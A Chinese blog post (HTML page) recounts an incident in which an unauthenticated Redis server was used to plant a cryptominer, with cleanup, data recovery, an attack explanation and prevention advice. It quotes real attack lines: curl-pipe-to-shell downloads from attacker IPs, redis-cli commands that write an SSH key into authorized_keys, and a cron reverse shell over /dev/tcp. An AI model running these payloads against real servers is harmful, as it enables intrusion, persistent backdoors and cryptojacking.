@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          谈一个Redis漏洞——记一次服务器被挖矿经历 - West2ers的博客 | West2ers&#39; Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://blog.w2fzu.com/2021/11/29/2021-11-29-谈一个Redis漏洞——记一次服务器被挖矿经历/">
+
+    <!-- Bootstrap Core CSS -->
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/hux-blog.min.css">
+
+
+    <!-- Pygments Highlight CSS -->
+    
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+    <!-- Custom Fonts -->
+    <!-- <link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">West2ers&#39; Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://blog.w2fzu.com/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#Java" title="Java">Java</a>
+                        
+                          <a class="tag" href="/tags/#19级" title="19级">19级</a>
+                        
+                    </div>
+                    <h1>谈一个Redis漏洞——记一次服务器被挖矿经历</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by JessieLin on
+                        2021-11-29
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="谈一个Redis漏洞——记一次服务器被挖矿经历"><a href="#谈一个Redis漏洞——记一次服务器被挖矿经历" class="headerlink" title="谈一个Redis漏洞——记一次服务器被挖矿经历"></a>谈一个Redis漏洞——记一次服务器被挖矿经历</h1><blockquote>
+<p>服务器：阿里云轻量应用服务器</p>
+<p>系统：centos 8.2</p>
+</blockquote>
+<h2 id="1-事件起因"><a href="#1-事件起因" class="headerlink" title="1 事件起因"></a>1 事件起因</h2><p>2021年11月21日中午12：37分左右，在做软工作业的我突然想直接用ARDM(一个Redis可视化工具)连连服务器上的Redis看看里面现在有啥（因为之前写码的时候忘记设置过期时间了，里面有不少没啥用的key)，然后直接去服务器控制台打开6379端口（之前也这么直连过一次但没出事），因为我知道Redis没有密码，所以我一小会直接用完马上就关闭了6379端口。</p>
+<p>13：14分，前端突然和我说后台连不上去了报Error，我试了下我也连不上去，域名访问全部失效，服务器挂了？，然后又试了下IP直接访问，可以访问，看来是转发层挂了。然后连服务器一看nginx的状态是failed，当时就在想nginx这么稳定竟然也会挂啊。然后试了下服务好了，就睡觉了，结果下午四点多突然前端又和我说服务又挂了，我直接懵了nginx今天抽风了？？？？然后我又重启了一遍nginx。结果很快啊大概不到半个小时它又又又挂了，我开始觉得不对劲了，啥情况啊？我systemctl nginx status一看，failed，但是这次我仔细看了failed的原因，killed？kill -9？这不是意味着进程被杀了嘛，内存不够？看了下服务器内存占用，好像空间也够啊，（这时候我看到CPU占用一直50%多，还以为阿里云抽风了）。这时候我意识到服务器是不是被人攻击了？后台是不是有程序一直在kill nginx？然后我输入ps aux一看，不看不要紧，一看就看到一个</p>
+<blockquote>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/bin/</span>sh -c curl -fsSL http:<span class="regexp">//</span><span class="number">45.133</span>.<span class="number">203.192</span><span class="regexp">/cleanfda/i</span>nit.sh | sh</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>的进程，我在想，这IP是啥啊，看着好陌生。结果一百度，就百度到了Redis被攻击注入挖矿脚本。突然前面的一切都解释通了…服务器被人注入挖矿脚本。然后我赶紧kill -9把这个进程kill了。</p>
+<p>然后又百度了一下，让我去看定时任务，好嘛，那我crontab -l一看，就看到一个sh /etc/newinit.sh，想想我以前肯定没弄过定时任务，果断cd到etc下删除，结果报operation not permiited。就奇了怪了我是root用户，居然还有我root删不掉的东西？百度了一下原来linux还有chattr lsattr这种给文件附加额外隐藏属性的命令，一输又报not found，需要先yum -y install e2fsprogs才能用。下了后用lsattr查看这个文件，</p>
+<blockquote>
+<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">lsattr</span> <span class="comment">newinit</span><span class="string">.</span><span class="comment">sh</span></span><br><span class="line">--<span class="literal">-</span><span class="literal">-</span><span class="comment">i</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">a</span>--<span class="literal">-</span><span class="literal">-</span> <span class="comment">newinit</span><span class="string">.</span><span class="comment">sh</span> <span class="comment">(可能a的位置不对，百度也百度不到，当时没截图)</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>果然被附加了ia的锁，用</p>
+<blockquote>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chattr -ia <span class="keyword">new</span><span class="type">init</span>.sh</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>就能解开文件的锁，然后就可以用rm -rf删掉文件了。这时候其实服务器CPU已经降下来了。可以用top命令检查CPU情况，确认一下没有其他异常的进程。但是这时服务器仍然残留着脚本和后门，请看第二部分。</p>
+<p>*ARDM （Another Redis Desktop Manager，一个很好用的免费的Redis可视化管理工具，可以在github上找到）</p>
+<h2 id="2-被攻击后的处理"><a href="#2-被攻击后的处理" class="headerlink" title="2 被攻击后的处理"></a>2 被攻击后的处理</h2><p>注意！如果你的Redis访问量比较大或者aof文件重新触发的阈值比较低，在受到攻击后请立刻关闭redis，避免aof文件被重写造成数据无法恢复的后果。</p>
+<p>先用top指令或ps aux指令或pstree查看异常进程，kill掉对应进程。注意这些指令很可能被掉包导致异常，如果指令无法执行，请先执行下面的步骤。</p>
+<p>根据百度到的全部信息，我检查了以下内容</p>
+<ul>
+<li><p>/etc/newinit.sh 执行挖矿任务的脚本，同时会kill掉其他进程，比如阿里云的云盾、nginx、其他挖矿进程（挖矿也内卷），并添加sshkey到服务器中。</p>
+<ul>
+<li>可以先重启阿里云的云盾等服务，可以下载看挖矿脚本的前面几十行，一般都是先关掉防护，对应重新打开相应服务即可。</li>
+</ul>
+</li>
+<li><p>/etc/cron.d 定时任务路径，检查里面是否有异常文件，如果没设置过建议全删</p>
+<ul>
+<li>还有cron.daily hourly…等</li>
+</ul>
+</li>
+<li><p>/etc/ 下是否有异常的脚本，或者叫zzh之类的文件，如果有删除即可，删不了先用lsattr看看有哪些隐藏属性，然后用chattr解锁，还有删不了的用chmod命令试试看。再不行可以试试chattr +ai 文件名重新加锁，然后再重新解锁，或许就能删除了。</p>
+</li>
+<li><p>**/root/.ssh/authorized_keys **  ssh文件，一般会被植入攻击者的公钥，记得删除。如果下面有攻击者的公钥并且服务器允许ssh，那么不用密码就可以直接进入服务器，非常危险。我在里面发现了和网络上那些被攻击的服务器一样的ssh key，果断直接删除整个authorized_keys文件</p>
+</li>
+<li><p><strong>/root/.ssh/known_hosts</strong>  中是否有未知的hosts</p>
+</li>
+<li><p>/etc/sysconfig/iptables 可疑地址和端口</p>
+</li>
+<li><p>/etc/rc.local，/etc/rc.sysinit，/etc/inittab，/etc/profile 等开机启动项中，是否有异常。</p>
+</li>
+<li><p>systemctl list-unit-files 查看是否有异常的开机服务，如有通过chkconfig 服务名 off关闭</p>
+</li>
+<li><p>可以find一下所有的.sh结尾的文件 确认一下没有异常的文件。</p>
+</li>
+<li><p>可以ll 查看文件详细信息，通过检查文件的时间判断是不是攻击者写入的文件</p>
+</li>
+<li><p>备份挖矿的脚本，分析挖矿脚本内容，重开被脚本杀掉的其他服务。我通过分析脚本发现一些命令被mv到其他文件夹了，如有请恢复。</p>
+<ul>
+<li>由于挖矿脚本中涉及到的内容非常长，此处不再列出，<a target="_blank" rel="noopener" href="https://www.renfei.net/posts/1003501">可以点击这里查看其它博主的详细分析</a>,或自己下载对应脚本分析其中的内容。</li>
+</ul>
+</li>
+<li><p>重启服务器，检查服务器状态。</p>
+</li>
+</ul>
+<h2 id="3-Redis的恢复"><a href="#3-Redis的恢复" class="headerlink" title="3 Redis的恢复"></a>3 Redis的恢复</h2><p>被攻击后Redis的数据会被清空，并被写入特殊的key，可以keys  * 查看所有的keys，可能有backup1之类的key，全部删掉，然后kill掉redis。此时redis的rdb备份文件路径一定被篡改到了crontab或者.ssh之类的文件夹里，不过只要配置文件没被改动，重启后会直接按配置文件重新加载。你需要找到redis的aof文件，可以下下来用vscode之类的工具打开（对vim操作熟悉的也可以直接用vim操作），直接查找flushall来定位位置，然后把那一块附近的异常代码删除。</p>
+<p>通常如下。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">flushall </span><br><span class="line">*<span class="number">3</span>  <span class="comment">#*3表示下面有三个操作字符串 此处是set backup1 */2那一坨</span></span><br><span class="line"><span class="variable">$3</span> <span class="comment"># $3表示下面那个字符串长度为3</span></span><br><span class="line">set</span><br><span class="line"><span class="variable">$7</span></span><br><span class="line">backup1</span><br><span class="line"><span class="variable">$75</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*<span class="regexp">/2 * * * * cd1 -fsSL http:/</span><span class="regexp">/194.87.139.103:8080/</span>cleanfda/init.sh | sh</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>找到后根据aof文件的规则删除，少删了*或者$也没事，关键是把相关的flush指令和set指令干掉。干掉后，需要用</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">./redis-check-aof</span> <span class="params">--fix</span> appendonly.aof</span><br></pre></td></tr></table></figure>
+
+<p>来修复aof文件，按y确认即可修复。用这个aof文件覆盖之前的aof文件即可。然后启动或重启redis，默认redis会从AOF文件中恢复数据。这样操作后你的大部分数据应该都能回来。</p>
+<p>如果你没开AOF，那你的数据多半是寄了。RDB文件是二进制文件，如果你想通过改RDB文件来恢复，那难度有点高。</p>
+<h2 id="4-攻击原理分析"><a href="#4-攻击原理分析" class="headerlink" title="4 攻击原理分析"></a>4 攻击原理分析</h2><p>Redis如果没有设置密码并且bind是0.0.0.0并且protected-mode为no并且以root等较高权限运行，那么可以直接外网远程连接操作redis写入文件到任意路径。通常来说，原理是这样的</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.63.130:6379</span>&gt; config set dir /root/.ssh/</span><br><span class="line">OK</span><br><span class="line"><span class="number">192.168.63.130:6379</span>&gt; config set dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line"><span class="number">192.168.63.130:6379</span>&gt; set x <span class="string">&quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\n\n\n&quot;</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">192.168.63.130:6379</span>&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># redis-cli </span><br><span class="line"><span class="number">127.0.0.1:6379</span>&gt; CONFIG SET dir /var/spool/cron &lt;--切换到定时任务目录</span><br><span class="line">OK</span><br><span class="line"><span class="number">127.0.0.1:6379</span>&gt; CONFIG SET dbfilename root &lt;--生成一个名为root的文件</span><br><span class="line">OK</span><br><span class="line"><span class="number">127.0.0.1:6379</span>&gt; set payload <span class="string">&quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.0.2.5/9999  0&gt;&amp;1\n\n&quot;</span>  &lt;--设置反弹shell</span><br><span class="line">OK</span><br><span class="line"><span class="number">127.0.0.1:6379</span>&gt; save </span><br></pre></td></tr></table></figure>
+
+<p>以上均来自网络。原理是redis可以动态改变配置，通过改变路径到相应的文件夹下并设置RDB文件名，然后写入key并save，这个key就被保存到相应文件里了。神奇的是刚好key的value写入RDB后不会乱码并且能正确的被centos解析出来。第一种是写入sshkey，写入成功后可以免密ssh登录目标主机。第二种是通过向系统写入root的定时脚本，通过脚本反弹shell，把shell暴露给外网（如果是ubuntu的话，第二种方式可能不太行）。只要能操作目标主机的shell那是想干啥干啥。由于redis具有root权限，所以以上操作均能正常执行。</p>
+<p>还有一种方式就是redis的rdb文件切到crontab定时任务目录下，直接写入wget命令获取远程主机脚本并sh，等crontab下的命令被定时执行时就会触发。本人应该是被此种方式攻击。</p>
+<p>总之，Redis攻击的原理无外乎改变rdb文件路径来往对应路径写入所需的内容。</p>
+<h2 id="5-预防"><a href="#5-预防" class="headerlink" title="5 预防"></a>5 预防</h2><p>通过本漏洞攻击需要满足4个条件</p>
+<ul>
+<li>1.Redis端口对外网暴露</li>
+<li>2.Redis没有设置强密码（弱密码很可能被撞开）</li>
+<li>3.Redis以较高的权限运行</li>
+<li>4.Redis配置中 bind属性为0.0.0.0并且关闭了protected-mode</li>
+</ul>
+<p>因此预防攻击，建议</p>
+<ul>
+<li><p>给Redis设置强密码，尤其是需要外网访问的情况下。服务器不少端口每天都会被很多扫描工具轮番照顾，没有密码，哪怕只开放一小会中招的几率也非常大，不要存在侥幸心理。</p>
+</li>
+<li><p>如果可能，bind尽量不要设置为0.0.0.0。</p>
+</li>
+<li><p>没有外网使用的情况下，尽量关闭相应的防火墙端口，避免被暴力试出密码，<strong>redis本身没有对输错密码的次数做限制</strong>。</p>
+</li>
+<li><p>建立低权限账户，授予其读取写入执行redis文件夹权限，并关闭其登录系统的权限。这样即使redis被攻破，攻击者也只能破坏你的redis中的数据，无法对系统其它部分造成影响。</p>
+</li>
+</ul>
+<h2 id="6-吐槽"><a href="#6-吐槽" class="headerlink" title="6 吐槽"></a>6 吐槽</h2><p>阿里云轻量应用服务器的防御应该不太行，这个脚本应该暴露好久了，结果这脚本在我服务器挖了那么久（大概四个小时）居然一点警报也没有，问客服也只是让我看看crontab下有没有定时任务让我清掉，隔壁腾讯云反倒能给出警报来。可能因为这个脚本很“贴心”的给我设置了50%的CPU占用上限导致没触发阿里云的机制吧。</p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2021/11/29/2021-11-29-微信支持H5跳转小程序、APP/" data-toggle="tooltip" data-placement="top" title="微信支持H5跳转小程序、App">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2021/11/28/2021-11-29-ES9正则新特性/" data-toggle="tooltip" data-placement="top" title="ES9正则表达式新特性">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+                <!-- disqus 评论框 start -->
+                <div class="comment">
+                    <div id="disqus_thread" class="disqus-thread"></div>
+                </div>
+                <!-- disqus 评论框 end -->
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#Java" title="Java">Java</a>
+                        
+                          <a class="tag" href="/tags/#19级" title="19级">19级</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="http://www.w2fzu.com" target="_blank">西二官网</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+<!-- disqus 公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = "w2blog";
+    var disqus_identifier = "https://blog.w2fzu.com/2021/11/29/2021-11-29-%E8%B0%88%E4%B8%80%E4%B8%AARedis%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A2%AB%E6%8C%96%E7%9F%BF%E7%BB%8F%E5%8E%86/";
+    var disqus_url = "https://blog.w2fzu.com/2021/11/29/2021-11-29-%E8%B0%88%E4%B8%80%E4%B8%AARedis%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A2%AB%E6%8C%96%E7%9F%BF%E7%BB%8F%E5%8E%86/";
+
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<!-- disqus 公共JS代码 end -->
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("//cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+                    <li>
+                        <a target="_blank" href="https://weibo.com/west2gold">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; West2ers&#39; Blog 2023 
+                    <br>
+                    Theme by <a target="_blank" rel="noopener" href="https://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a target="_blank" rel="noopener" href="http://blog.kaijun.rocks">Kaijun</a> | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+
+<script src="/js/jquery.min.js"></script>
+
+
+<!-- Bootstrap Core JavaScript -->
+
+<script src="/js/bootstrap.min.js"></script>
+
+
+<!-- Custom Theme JavaScript -->
+
+<script src="/js/hux-blog.min.js"></script>
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://blog.w2fzu.com/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://blog.w2fzu.com/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
